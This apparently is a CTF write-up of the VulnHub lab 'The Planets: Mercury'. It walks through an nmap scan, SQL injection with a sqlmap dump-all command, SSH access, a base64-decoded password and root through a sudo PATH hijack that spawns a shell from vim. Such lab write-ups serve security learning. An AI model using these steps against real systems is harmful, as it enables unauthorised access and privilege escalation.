---
title: The Planets:Mercury - Writeup
author: Elman Alizadeh
date: 2022-06-06 21:00:00 +0800
categories: [ctf, VulnHub]
tags: [vulnhub, planets]
---

Today we will take a look at Vulnhub: The Planets: Mercury. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/vuln-mercury/1.jpeg" | relative_url }})

## Nmap

```console
$ sudo nmap -p- -sCV --open 192.168.0.114

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)
|   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)
|_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)
8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Mon, 06 Jun 2022 15:57:23 GMT
|     Server: WSGIServer/0.2 CPython/3.8.2
|     Content-Type: text/html
|     X-Frame-Options: DENY
|     Content-Length: 2366
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=utf-8">
|     <title>Page not found at /nice ports,/Trinity.txt.bak</title>
|     <meta name="robots" content="NONE,NOARCHIVE">
|     <style type="text/css">
|     html * { padding:0; margin:0; }
|     body * { padding:10px 20px; }
|     body * * { padding:0; }
|     body { font:small sans-serif; background:#eee; color:#000; }
|     body>div { border-bottom:1px solid #ddd; }
|     font-weight:normal; margin-bottom:.4em; }
|     span { font-size:60%; color:#666; font-weight:normal; }
|     table { border:none; border-collapse: collapse; width:100%; }
|     vertical-align:
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 06 Jun 2022 15:57:23 GMT
|     Server: WSGIServer/0.2 CPython/3.8.2
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Content-Length: 69
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Hello. This site is currently in development please check back later.
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: WSGIServer/0.2 CPython/3.8.2
```

## Web

/nice ports

![Desktop View]({{ "/assets/img/vuln-mercury/1.png" | relative_url }})

/mercuryfacts

Click Load a fact.

http://192.168.0.114:8080/mercuryfacts/1/

```console
When you write the ' character we get a reply.
```
![Desktop View]({{ "/assets/img/vuln-mercury/2.png" | relative_url }})

## Sqlmap

```console
sqlmap -u http://192.168.0.114:8080/mercuryfacts/1 --batch --dump-all
```

![Desktop View]({{ "/assets/img/vuln-mercury/3.png" | relative_url }})

## Ssh

```console
ssh webmaster@192.168.0.114
```

## linuxmaster

In the mercury_proj folder, in notes.txt, there are information about the other user. Let’s use it and find your password.

```console
$ echo 'bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==' | base64 -d

mercurymeandiameteris4880km

$ su linuxmaster
```

## Root

```console
linuxmaster@mercury:~$ sudo -l
[sudo] password for linuxmaster: 
Matching Defaults entries for linuxmaster on mercury:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User linuxmaster may run the following commands on mercury:
    (root : root) SETENV: /usr/bin/check_syslog.sh

linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh 
---------------------------
#!/bin/bash
tail -n 10 /var/log/syslog
---------------------------

linuxmaster@mercury:~$ ls -l /usr/bin/check_syslog.sh

-rwxr-xr-x 1 root root 39 Aug 28  2020 /usr/bin/check_syslog.sh

linuxmaster@mercury:~$ ln -s /bin/vim tail

linuxmaster@mercury:~$ export PATH=.:$PATH

linuxmaster@mercury:~$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh 

:!/bin/bash
```

![Desktop View]({{ "/assets/img/vuln-mercury/4.png" | relative_url }})

### And now we are the root

![Desktop View]({{ "/assets/img/vuln-mercury/1.png" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”